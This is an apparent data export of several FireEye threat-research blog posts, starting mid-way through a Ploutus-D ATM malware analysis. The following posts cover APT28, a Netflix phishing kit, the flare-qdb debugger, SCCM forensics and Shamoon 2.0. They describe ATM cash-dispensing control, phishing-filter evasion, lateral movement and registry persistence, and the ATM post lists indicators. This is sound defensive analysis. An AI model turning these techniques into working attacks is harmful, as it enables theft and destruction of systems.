 <p>\HKLM\SOFTWARE\XFS\PHYSICAL_SERVICES\DBD_AdvFuncDisp\Denomination Table</p>
 <p>A similar strategy will be used to get the cassette’s status and
  type, to make sure they are working properly, and, more important, to
  identify that it has at least one bill to withdraw.</p>
 <p>Ploutus-D will load “KXCashDispenserLib” library implemented by
  Kalignite Platform (K3A.Platform.dll) to interact with the XFS Manager
  and control the Dispenser (see Figure 13).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig13.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 13: Loading Dispenser Class</span></p>
 <p>Figure 14 shows a graphical representation of the XFS Manager and
  its interaction with Kalignite Platform via KXCashDispenserLib.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig14.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 14: XFS Manager</span></p>
 <p>The knowledge shown in the code to properly implement all the
  different classes and methods to control the Dispenser suggests that
  the developers of the malware have either access to real ATMs during
  the development or they hired individuals with experience coding on
  these machines.</p>
 <h4>Expanding Ploutus to other ATM vendors</h4>
 <p>Kalignite Platform is said to support 40 ATM vendors. Looking at the
  code to dispense money, the only pieces adjusted to target Diebold are
  the different registry keys to read the cassette (DBD_AdvFuncDisp)
  parameters (see Figure 15).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig15.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 15: Getting Diebold Cassette parameters</span></p>
 <p>Since Ploutus-D interacts with the Kalignite Platform, only minor
  modifications to the Ploutus-D code may be required to target
  different ATM vendors worldwide.</p>
 <h4>Conclusion</h4>
 <p>As anticipated in our <a href=""https://www.fireeye.com/blog/executive-perspective/2016/11/questions_and_answer.html"">2017
    predictions report</a>, the use of ATM malware will continue to
  increase, especially in underdeveloped countries with weaker physical
  security controls. By leveraging the Kalignite Platform, Ploutus can
  be easily modified to attack various ATM vendors and operating systems.</p>
 <h4>Frequently Asked Questions</h4>
 <ol> <li>When was Ploutus-D first discovered?<ul> <li>Ploutus-D was
        uploaded to VirusTotal in November 2016.</li> </ul> </li>
    <li>Does Ploutus-D target cardholder information?<ul> <li>No. It is
        designed to dispense cash from within the ATM.</li> </ul> </li>
    <li>Is Ploutus-D already affecting ATMs in the wild?<ul> <li>Yes. It
        has been observed in Latin America.</li> </ul> </li> <li>What
    type of ATMs are affected?<ul> <li>Ploutus-D affects Diebold
      ATMs.</li> <li>Minor modifications could be made to Ploutus-D to
        affect other vendors using the Kalignite Platform.</li> </ul>
  </li> <li>How is Ploutus-D installed on the ATM?<ul> <li>Through
        physical access to the ATM.</li> </ul> </li> <li>How do
    attackers interact with Ploutus-D?<ul> <li>Via an external keyboard
        that needs to be connected to the ATM.</li> </ul> </li> </ol>
 <h4>IOCs</h4>
 <h5>FileSystem:</h5>
 <p>[D-Z]:\Data\P.bin<br /> C:\Diebold\EDC\edclocal.dat</p>
 <p>The following files should be found at the same place where the
  service Diebold.exe is located:</p>
 <p>Log.txt<br /> Log2.txt<br /> P.bin – Mac address of the system, plus
  string: “PLOUTUS-MADE-IN-LATIN-AMERICA-XD”<br /> PDLL.bin – Encoded
  version of P.bin</p>
 <h5>Mutex names:</h5>
 <p>Ploutos<br /> DIEBOLDPL<br /> KaligniteAPP</p>
 <h5>Services:</h5>
 <p>Service Name: DIEBOLDP</p>
 <h5>Registry:</h5>
 <p>\\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit=”Diebold.exe,%system32%/userinit.exe”</p>",http://www.fireeye.com/blog/threat-research/2017/01/new_ploutus_variant.html
APT28: At the Center of the Storm,"<p>On Jan. 6, 2017, the U.S. Director of National Intelligence released
  its Intelligence Community Assessment:<i> Assessing Russian Activities
    and Intentions in Recent US Elections.</i> Still, questions persist
  about Russian involvement. Did the Russian government direct the group
  responsible for the breaches and related data leaks? If so, is this
  simply a matter of accepted state espionage, or did it cross a line?
  Was the breach at the Democratic National Committee part of a
  concerted effort by the Russian government to interfere with the U.S.
  presidential election?</p>
 <p>The most consequential question remains unasked: How will Russia
  continue to employ a variety of methods – including hacks and leaks –
  to undermine the institutions, policies and actors that the Russian
  government perceives as constricting and condemning its forceful
  pursuit of its state aims?</p>
 <p>FireEye’s visibility into the operations of APT28 – a group we
  believe the Russian government sponsors – has given us insight into
  some of the government’s targets, as well as its objectives and the
  activities designed to further them.</p>
 <p>We have tracked and profiled this group through multiple
  investigations, endpoint and network detections, and continuous
  monitoring. Our visibility into APT28’s operations, which date to at
  least 2007, has allowed us to understand the group’s malware,
  operational changes and motivations. This intelligence has been
  critical to protecting and informing our clients, exposing this threat
  and strengthening our confidence in attributing APT28 to the Russian government.</p>
 <p>Our latest report, <i>APT28: At the Center of the Storm</i>, <a href=""https://www2.fireeye.com/WEB-2017-RPT-APT28.html?utm_source=FEcom&amp;utm_campaign=intel-apt28&amp;utm_medium=blog"" target=""_blank"">is available here</a>.  </p>
 <p>You can also <a href=""https://engage.vevent.com/index.jsp?eid=4929&amp;seid=1697&amp;code=blog"" target=""_blank"">register for our webinar</a> on Feb. 21, 2017, at 8
  a.m. PT/11 a.m. ET/4 p.m. GMT (UK), which will feature additional
  insights from Jonathan Wrolstad, Senior Threat Intelligence Analyst
  with FireEye, and Robert Morgus, Policy Analyst with New America’s
  Cybersecurity Initiative.</p>",http://www.fireeye.com/blog/threat-research/2017/01/apt28_at_the_center.html
Credit Card Data and Other Information Targeted in Netflix Phishing Campaign,"<h5>Introduction</h5>
 <p>Through FireEye’s <a href=""https://www.fireeye.com/content/fireeye-www/en_US/products/ex-email-security-products.html"" target=""_blank"">Email Threat Prevention</a> (ETP) solution, FireEye
  Labs discovered a phishing campaign in the wild targeting the credit
  card data and other personal information of Netflix users primarily
  based in the United States.</p>
 <p>This campaign is interesting because of the evasion techniques that
  were used by the attackers:</p>
 <ul> <li>The phishing pages were hosted on legitimate, but compromised
    web servers.</li> <li>Client-side HTML code was obfuscated with AES
    encryption to evade text-based detection.</li> <li>Phishing pages
    were not displayed to users from certain IP addresses if its DNS
    resolved to companies such as Google or PhishTank.</li> </ul>
 <p>At the time of posting, the phishing websites we observed were no
  longer active.</p>
 <h5>Attack Flow</h5>
 <p>The attack seems to start with an email notification – sent by the
  attackers – that asks the user to update their Netflix membership
  details. The phishing link inside the email body directs recipients to
  a page that attempts to mimic a Netflix login page, as seen in Figure 1.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Fake login page mimicking the Netflix website</span></p>
 <p>Upon submitting their credentials, victims are then directed to
  webpages requesting additional membership details (Figure 2) and
  payment information (Figure 3). These websites also attempt to mimic
  authentic Netflix webpages and appear legitimate. Once the user has
  entered their information, they are taken to the legitimate Netflix homepage.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: Fake webpage asking users to update
    their personal details</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: Netflix phishing webpage used to steal
    credit card information</span></p>
 <h5>Technical Details</h5>
 <p>The phishing kit uses techniques to evade phishing filters. One
  technique is the use of AES encryption to encode the content presented
  at the client’s side, as seen in Figure 4. The purpose of using this
  technique is code obfuscation, which helps to evade text-based
  detection. By obfuscating the webpage, attackers try to deceive
  text-based classifiers and prevent them from inspecting webpage
  content. This technique employs two files, a PHP and a JavaScript file
  that have functions to encrypt and decrypt input strings. The PHP file
  is used to encrypt the webpages at the server side, as seen in Figure
  5. At the client side, the encrypted content is decoded using a
  defined function in the JavaScript file, as seen in Figure 6. Finally,
  the webpage is rendered using the ‘document.write’ function.<img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4: Client-side code obfuscation using AES encryption</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: PHP code used at server side for encryption</span></p>
 <p>
  <i>
    <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig6.png"" /></i></p>
 <p>
  <span class=""type-XS"">Figure 6: JavaScript code used at client-side
    for decryption</span></p>
 <p>Another technique is the host-based evasion, as seen in Figure 7.
  The host name of organizations such as ‘phishtank’ and ‘google’ are
  blacklisted. The host name of the client is compared against a list of
  blacklisted host names. If there is a match against the blacklist, a
  “404 Not Found” error page is presented.</p>
 <p>
  <a href=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig7.png"" target=""_blank""><img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig7.png"" /></a></p>
 <p>
  <span class=""type-XS"">Figure 7: Server side code for blacklisting
    known hosts. Click image to enlarge.</span></p>
 <p>As with the majority of phishing attacks, this campaign uses PHP
  mail utility to send the attacker the stolen credentials. The
  advantage of using this technique is that the attacker can host their
  phishing kits on a number of websites and still get the stolen
  credentials and other information from a single email account. This
  enables attackers to extend their reach.</p>
 <p>
  <a href=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig8a.png"" target=""_blank""><img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig8a.png"" /></a></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig8b.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8: Stolen information is sent to an email
    address using mail() function</span></p>
 <h5>Tips to Secure your Netflix Account</h5>
 <p>To learn more about securing your Netflix account, Netflix provides
  additional information on how to keep your account safe from phishing
  scams and other fraudulent activity at https://www.netflix.com/security.</p>",http://www.fireeye.com/blog/threat-research/2017/01/credit_card_dataand.html
"FLARE Script Series: Querying Dynamic State using the FireEye Labs
Query-Oriented Debugger (flare-qdb)","<h4>Introduction</h4>
 <p>This post continues the FireEye Labs Advanced Reverse Engineering
  (FLARE) script series. Here, we introduce flare-qdb, a command-line
  utility and Python module based on vivisect for querying and altering
  dynamic binary state conveniently, iteratively, and at scale.
  flare-qdb works on Windows and Linux, and can be obtained from the <a href=""https://www.github.com/fireeye/flare-qdb"">flare-qdb github project</a>.</p>
 <h4>Motivation</h4>
 <p>Efficiently understanding complex or obfuscated malware frequently
  entails debugging. Often, the linear process of following the program
  counter raises questions about parallel or previous register states,
  state changes within a loop, or if an instruction will ever be
  executed at all. For example, a register’s value may not become
  interesting until the analyst learns it was an important input to a
  function that has already been executed. Restarting a debug session
  and cataloging the results can take the analyst out of the original
  thought process from which the question arose.</p>
 <p>A malware analyst must constantly judge whether such inquiries will
  lend indispensable observations or extraneous distractions. The wrong
  decision wastes precious time. It would be useful to query malware
  state like a database, similar to the following:</p>
 <p>SELECT eax, poi(ebp-0x14) FROM malware.exe WHERE eip = 0x401072</p>
 <p>FLARE has devised a command-line tool to efficiently query dynamic
  state and more in a similar fashion. The following is a description of
  this tool with examples of how it has been used within FLARE to
  analyze malware, simulate new scenarios, and even solve challenges
  from the 2016 FLARE-On challenge.</p>
 <h4>Usage</h4>
 <p>Drawing heavily from <a href=""https://github.com/vivisect/vivisect"">vivisect</a>, flare-qdb is
  an open source tool for efficiently posing sophisticated questions and
  obtaining simple answers from binaries. flare-qdb’s command-line
  syntax is as follows:</p>
 <p>flareqdb &quot;&lt;cmdline&gt;&quot; -at &lt;address&gt; &quot;&lt;python&gt;&quot;</p>
 <p>flare-qdb allows an analyst to execute a command line of their
  choosing, break on arbitrary program counter values, optionally check
  conditions, and display or alter program state with ad-hoc Python
  code. flare-qdb implements several WinDbg-like builtins for querying
  and modifying state. Table 1 lists a few illustrative example queries.</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""230""><p>
          <b>Experiment or Alteration</b></p> </td> <td valign=""top"" width=""284""><p>
          <b>Query</b></p> </td> </tr>
    <tr>
      <td valign=""top"" width=""230""><p>What two DWORD arguments are
          passed to kernel32!Beep? (WinDbg analog: dd)</p> </td> <td valign=""top"" width=""284""><p>-at kernel32.Beep &quot;dd('esp+4',
        2)&quot;</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""230""><p>Terminate if eax is null at
          0x401072 (WinDbg analog: .kill)</p> </td> <td valign=""top"" width=""284""><p>-at-if 0x401072 eax==0 &quot;kill()&quot;</p>
      </td> </tr>
    <tr>
      <td valign=""top"" width=""230""><p>Alter ecx programmatically (WinDbg
          analog: r)</p> </td> <td valign=""top"" width=""284""><p>-at
          malwaremodule+0x102a &quot;r('ecx', '(ebp-0x14)*eax')</p>
      </td> </tr>
    <tr>
      <td valign=""top"" width=""230""><p>Alter memory programmatically</p>
      </td> <td valign=""top"" width=""284""><p>-at 0x401003
          &quot;memset('ebp-0x14', 0x2a, 4)&quot;</p> </td> </tr></tbody></table>
 <p>
  <span class=""type-XS"">Table 1: Example flare-qdb queries</span></p>
 <h5>Using the flareqdb Command Line</h5>
 <p>The usefulness of flare-qdb can be seen in cases such as loops
  dealing with strings. Figure 1 shows the flareqdb command line utility
  being used to dump the Unicode string pointed to by a stack variable
  for each iteration of a loop. The output reveals that the variable is
  used as a runner pointer iterating through argv[1].</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FLARE%20script%20series%20bailey/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Using flareqdb to monitor a string
    within a loop</span></p>
 <p>Another example is challenge 4 from the 2016 FLARE-On Challenge
  (spoiler alert: partial solution presented below, full walkthrough is
    <a href=""https://www.fireeye.com/content/dam/fireeye-www/global/en/blog/threat-research/flareon2016/challenge4-solution.pdf"">here</a>).</p>
 <p>In flareon2016challenge.dll, a decoded PE file contains a series of
  calls to kernel32!Beep that must be tracked in order to construct the
  correct sequence of calls to ordinal #50 in the challenge binary.
  Figure 2 shows a flareqdb one-liner that forwards each kernel32!Beep
  call to ordinal #50 in the challenge binary to obtain the flag.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FLARE%20script%20series%20bailey/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: Using flareqdb to solve challenge 4 of
    the 2016 FLARE-On Challenge</span></p>
 <p>flareqdb can also force branches to be taken, evaluate function
  pointer values, and validate suspected function addresses by
  disassembling. For example, consider the subroutine in Figure 3, which
  is only invoked if a set of conditions is satisfied and which calls a
  C++ virtual function. Identifying this function could help the analyst
  identify its caller and discover what kind of data to provide through
  the command and control (C2) channel to exercise it.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FLARE%20script%20series%20bailey/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: Unidentified function with virtual
    function call</span></p>
 <p>Using the flareqdb command-line utility, it is possible to divert
  the program counter to bypass checks on the C2 data that was provided
  and subsequently dump the address of the function pointer that is
  called by the malware at program counter 0x4029a4. Thanks to vivisect,
  flare-qdb can even disassemble the instructions at the resulting
  address to validate that it is indeed a function. Figure 4 shows the
  flareqdb command-line utility being used to force control flow at
  0x4016b5 to proceed to 0x4016bb (not shown) and later to dump the
  function pointer called at 0x4029a4.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FLARE%20script%20series%20bailey/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4: Forcing a branch and resolving a C++
    virtual function call</span></p>
 <p>The function pointer resolves to 0x402f32, which IDA has already
  labeled as basic_streambuf::xsputn as shown in Figure 5. This function
  inserts a series of characters into a file stream, which suggests a
  file write capability that might be exercised by providing a filename
  and/or file data via the C2 channel.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FLARE%20script%20series%20bailey/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: Resolved virtual function address</span></p>
 <h5>Using the flareqdb Python Module</h5>
 <p>flare-qdb also exists as a Python module that is useful for more
  complex cases. flare-qdb allows for ready use of the powerful vivisect
  library. Consider the logic in Figure 6, which is part of a privilege
  escalation tool. The tool checks GetVersionExW, NetWkstaGetInfo, and
  IsWow64Process before exploiting CVE-2016-0040 in WMI.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FLARE%20script%20series%20bailey/Fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: Privilege escalation platform check</span></p>
 <p>It appears as if the tool exploits 32-bit Windows installations with
  version numbers 5.1+, 6.0, and 6.1. Figure 7 shows a script to quickly
  validate this by executing the tool 12 times, simulating different
  versions returned from GetVersionExW and NetWkstaInfo. Each time the
  script executes the malware, it indicates whether the malware reached
  the point of attempting the privilege escalation or not. The script
  passes a dictionary of local variables to the Qdb instance for each
  execution in order to permit the user callback to print the friendly
  name of each Windows version it is simulating for the binary. The
  results of GetVersionExW are modified prior to return using the
  vstruct definition of the OSVERSIONINFOEXW; NetWkstaGetInfo is fixed
  manually for brevity and in the absence of a definition corresponding
  to the WKSTA_INFO_100 structure.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FLARE%20script%20series%20bailey/Fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7: Script to test version check</span></p>
 <p>Figure 8 shows the output, which confirms the analysis of the logic
  from Figure 6.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FLARE%20script%20series%20bailey/Fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8: Script output</span></p>
 <p>Next, consider an example in which the analyst must devise a
  repeatable process to unpack a binary and ascertain the locations of
  unpacked PE-COFF files injected throughout memory. The script in
  Figure 9 does this by setting a breakpoint relative to the tail call
  and using vivisect’s envi module to enumerate all the RWX memory
  locations that are not backed by a named file. It then uses
  flare-qdb’s park() builtin before calling detach() so that the binary
  runs in an endless loop, allowing the analyst to attach a debugger and
  resume manual analysis.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FLARE%20script%20series%20bailey/Fig9.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 9: Unpacker script that parks its
    debuggee after unpacking is complete</span></p>
 <p>Figure 10 shows the script announcing the locations of the
  self-injected modules before parking the process in an infinite loop
  and detaching.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FLARE%20script%20series%20bailey/Fig10.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 10: Result of unpacker script</span></p>
 <p>Attaching with IDA Pro via WinDbg as in Figure 11 shows that the
  program counter points to the infinite loop written in memory
  allocated by flare-qdb. The park() builtin stored the original program
  counter value in the bytes following the jmp instruction. The analyst
  can return the program to its original location by referring to those
  bytes and entering the WinDbg command r eip=1DC129B.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FLARE%20script%20series%20bailey/Fig11.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 11: Attaching to the parked process</span></p>
 <p>The parked process makes it convenient to snapshot the malware
  execution VM and repeatedly connect remotely to exercise and annotate
  different code areas with IDA Pro as the debugger. Because the same OS
  process can be reused for multiple debug sessions, the memory map
  announced by the script remains the same across debugging sessions.
  This means that the annotations created in IDA Pro remain relevant
  instead of becoming disconnected from the varying data and code
  locations that would result from the non-deterministic heap addresses
  returned by VirtualAlloc if the program were simply executed multiple times.</p>
 <h4>Conclusion</h4>
 <p>flare-qdb provides a command-line tool to quickly query dynamic
  binary state without derailing the thought process of an ongoing
  debugging session. In addition to querying state, flare-qdb can be
  used to alter program state and simulate new scenarios. For intricate
  cases, flare-qdb has a scripting interface permitting almost arbitrary
  manipulation. This can be useful for string decoding, malware
  unpacking, and general software analysis. Head over to the <a href=""https://github.com/fireeye/flare-qdb"">flare-qdb github
  page</a> to get started using it.</p>",http://www.fireeye.com/blog/threat-research/2017/01/flare_script_series.html
Do You See What I CCM?,"<h5>
  <b>SCCM Software Metering</b></h5>
 <p>Reviewing forensic keyword searches can be confusing because it is
  often difficult for an analyst to determine the source of the various
  structures that contain string matches. One such structure belongs to
  Microsoft's System Center Configuration Manager's (SCCM) software
  metering history, which can record the path, name, size, associated
  user name, last used time, launch count, and PE metadata of executed files.</p>
 <p>Microsoft designed SCCM software metering to report application
  usage for statistical analysis. <a href=""https://technet.microsoft.com/en-us/library/bb694145.aspx"">Microsoft
  TechNet</a> provides a more complete overview of this feature. While
  software metering data is meant to be reviewed by system
  administrators on the SCCM server, client systems retain execution
  history of recently used applications. For forensic investigators,
  this execution history can be a goldmine for identifying both the
  presence of deleted files and confirming that a file executed on a system.</p>
 <p>Since SCCM generates this data, it will only be recorded if the
  system is connected to a domain with an SCCM server and if software
  metering is enabled. For these reasons, this artifact will likely only
  exist on enterprise systems. Personal computers for home users or
  criminals likely will not contain this artifact.</p>
 <p>If enabled, Windows stores software metering execution logs as
  CCM_RecentlyUsedApps records in the Windows Management Instrumentation
  repository. The <a href=""https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf"">FireEye
    Labs Advanced Reverse Engineering (FLARE) team released scripts that
    parse this repository last year</a>. Using FLARE's <a href=""https://github.com/fireeye/flare-wmi/tree/master/python-cim"">python-cim</a>
  application, analysts can enumerate all allocated CCM_RecentlyUsedApps
  instances from the root\ccm\SoftwareMeteringAgent namespace of a WMI repository.</p>
 <h5>
  <b>Allocated Records</b></h5>
 <p>To extract allocated CCM_RecentlyUsedApps records from a WMI
  repository, python-cim requires the CIM repository files OBJECTS.DATA,
  MAPPING*.MAP, and INDEX.BTR from the
  C:\Windows\System32\wbem\Repository directory on a host.  Figure 1
  provides a command to extract allocated CCM_RecentlyUsedApps records
  from CIM repository file located in WMI_Repo/ with python-cim.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Do%20you%20see%20what%20I%20CCM%20Pany%20House/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Extracting allocated
    CCM_REcentlyUsedApps records with python-cim</span></p>
 <p>This may take a while to execute depending on the WMI repository's
  size. The output file will be tab delimited, which should parse easily
  into your favorite spreadsheet application. This data allows for
  keyword searching of files, paths and user accounts, as well as
  timeline analysis. However, the most useful analysis method for this
  data may be anomaly detection.</p>
 <p>Figure 2 provides a transposed excerpt of python-cim’s
  show_CCM_RecentlyUsedApps.py output. Note how legitimate files contain
  PE metadata fields such as description, company name and product name
  while the attacker did not configure that information in the malicious
  file C:\Windows\Temp\evl.exe. Since legitimate files usually contain
  this metadata, identifying null values is a great place to begin
  analysis. Also note that some fields may not be recorded.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Do%20you%20see%20what%20I%20CCM%20Pany%20House/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: Extracted CCM_RecentlyUsedApps records
    from python-cim</span></p>
 <h5>
  <b>Unallocated Records</b></h5>
 <p>Even though python-cim can extract CCM_RecentlyUsedApps records, old
  records may have been moved to inactive pages or even partially
  overwritten. Due to an easily identifiable header and well defined
  object structure, we can carve all allocated and unallocated
  CCM_RecentlyUsedApps records from the OBJECTS.DATA file with <a href=""https://github.com/davidpany/WMI_Forensics/blob/master/CCM_RUA_Finder.py"">CCM_RUA_Finder.py</a>.</p>
 <h5>
  <b>Record Structure</b></h5>
 <p>To understand how to carve CCM_RecentlyUsedApps records we must
  understand the structure of the WMI CCM_RecentlyUsedApps class, as
  each record is an instance of this class. All WMI class definitions
  share a similar structure that at a high-level consists of a header
  section, a property section and a data section. The header section
  contains a unique GUID that allows us to quickly identify class
  instances in the raw data, and the property and data sections contain
  the values we are interested in carving. Most importantly, the
  <i>order</i> of the values in the property and data sections is
  static, meaning we can reliably carve fields using a combination of
  offsets and regular expressions.</p>
 <p>Figure 3 provides a sample hexdump of a CCM_RecentlyUsedApps class
  instance from an OBJECTS.DATA file.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Do%20you%20see%20what%20I%20CCM%20Pany%20House/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: Hexdump of a complete
    CCM_RecentlyUsedApps record from an OBJECTS.DATA file</span></p>
 <p>Figure 4 provides the parsed contents of this CCM_RecentlyUsedApps
  class instance and highlights values of interest.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Do%20you%20see%20what%20I%20CCM%20Pany%20House/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4: Parsed contents of a
    CCM_RecentlyUsedApps record with highlighted values of interest</span></p>
 <p>A complete analysis of WMI class and class instance structures is
  covered in the FLARE team’s “<a href=""https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf"">Windows
    Management Instrumentation (WMI) Offense, Defense, and
  Forensics</a>” white paper.</p>
 <h5>
  <b>Carving Records</b></h5>
 <p>CCM_RUA_Finder.py can extract complete and even some partially
  overwritten CCM_RecentlyUsedApps records from any OBJECTS.DAT file
  that contains such CCM_RecentlyUsedApps class instances. The tab
  delimited output will open nicely in your spreadsheet editor and
  provide the same analysis capabilities stated earlier. Figure 5
  provides a command to extract allocated, unallocated and partially
  overwritten CCM_RecentlyUsedApps records from an OBJECTS.DATA file
  with CCM_RUA_Finder.py.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Do%20you%20see%20what%20I%20CCM%20Pany%20House/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: Extracting allocated, unallocated, and
    partially overwritten CCM_RecentlyUsedApps records with CCM_RUA_Finder.py</span></p>
 <p>This command should complete quickly and will carve records to
  produce output as seen in Figure 6.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Do%20you%20see%20what%20I%20CCM%20Pany%20House/Fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: Extracted full and carved
    CCM_RecentlyUsedApps records from CCM_RUA_Finder.py</span></p>
 <p>
  <b>Just One Piece of the Puzzle</b></p>
 <p>CCM_RecentlyUsedApps records are a great artifact to identify both
  executed files and deleted attacker files when available. As with all
  forensic artifacts, parsing these software metering agent log records
  should be just one part of a complete and well-balanced investigation strategy. </p>
 <p>Download <a href=""https://github.com/davidpany/WMI_Forensics/blob/master/CCM_RUA_Finder.py"">CCM_RUA_Finder.py</a>.</p>",http://www.fireeye.com/blog/threat-research/2016/12/do_you_see_what_icc.html
FireEye Responds to Wave of Destructive Cyber Attacks in Gulf Region,"<p>In 2012, a suspected Iranian hacker group called the “Cutting Sword
  of Justice” used malware known as Shamoon – or Disttrack. In
  mid-November, Mandiant, a FireEye company, responded to the first
  Shamoon 2.0 incident against an organization located in the Gulf
  states. Since then, Mandiant has responded to multiple incidents at
  other organizations in the region.</p>
 <p>Shamoon 2.0 is a reworked and updated version of the malware we saw
  in the 2012 incident. Analysis shows the malware contains embedded
  credentials, which suggests the attackers may have previously
  conducted targeted intrusions to harvest the necessary credentials
  before launching a subsequent attack.</p>
 <p>
  <i>FireEye HX and FireEye NX both detect Shamoon 2.0, and our
    Multi-Vector Virtual Execution (MVX) engine is also able to
    proactively detect this malware.</i></p>
 <p>The following is a summary of what we know about Shamoon 2.0 based
  on the samples we’ve analyzed:</p>
 <ul> <li>The malware scans the C-class subnet of the IP it has assigned
    to every interface on the system for target systems.</li> <li>The
    malware then tries to access the ADMIN$, C$\Windows, D$\Windows, and
    E$\Windows shares on the target systems with current
  privileges.</li> <li>If current privileges aren’t enough to access the
    aforementioned shares, it uses hard coded, domain specific
    credentials (privileged credentials, likely Domain Administrator or
    local Administrator) gained during an earlier phase of the attack to
    attempt the same.</li> <li>Once it has access, it enables the Remote
    Registry service on the target device and sets
    HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
    to 0 to enable share access.</li> <li>Once it has performed the
    earlier actions, it copies ntssrvr32.exe to the %WINDIR%\system32 of
    the target system and schedules an unnamed task (e.g. At1.job) to
    execute the malware.</li> <li>The identified malware had a hard
    coded date to launch the wiping. Systems infected with the malware
    scheduled the job to start the process shortly thereafter.</li>
    <li>The malware sets the system clock to a random date in August
    2012. Analysis suggests this might be for the purposes of ensuring
    the component (a legitimate driver used maliciously) that wipes the
    Master Boot Record (MBR) and Volume Boot Record (VBR) is within its
    test license validity period.</li> <li>While the original Shamoon
    malware attempted to overwrite operating system files with an image
    of a burning U.S. flag, the recently discovered variant attempts to
    overwrite Windows operating system files, although with a different
    image, a .JPG file depicting the death of Alan Kurdi, a Syrian child
    migrant who died while attempting to cross the Mediterranean
  Sea.</li> </ul>
 <p>The following is guidance for detecting the malware, counteracting
  its activity, and attempting to prevent it from propagating in an
  environment. Please note that performing any of these actions could
  have a negative effect and should not be implemented without proper
  review and study of the impact of the environment.</p>
